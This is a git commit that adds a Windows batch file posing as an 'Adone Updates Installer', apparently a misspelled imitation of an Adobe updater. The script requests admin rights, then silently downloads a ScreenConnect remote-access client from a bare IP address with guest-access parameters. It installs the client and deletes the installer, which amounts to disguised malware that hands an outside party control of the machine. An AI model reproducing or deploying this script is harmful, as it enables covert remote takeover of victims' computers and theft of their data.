029df2e0eacdff782ced697cb330caf4c14d04e6
ilyasoumai28-cmyk <ilyasoumai28@gmail.com>
2026-07-18 18:08:09 +0100

    Add files via upload

---
+++ win.bat
@@ -0,0 +1,14 @@
+@echo off
+title Adone Updates Installer
+
+
+net session >nul 2>&1
+if %errorlevel% neq 0 (
+    echo Requesting admin privileges...
+    powershell -Command "Start-Process '%~f0' -Verb RunAs"
+    exit /b
+)
+
+powershell -Command "$url='http://207.174.0.98/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest';$out=\"%TEMP%\ScreenConnect.ClientSetup.msi\";(New-Object Net.WebClient).DownloadFile($url,$out);msiexec /i \"$out\" /quiet /norestart;Start-Sleep 2;Remove-Item $out -Force"
+
+exit
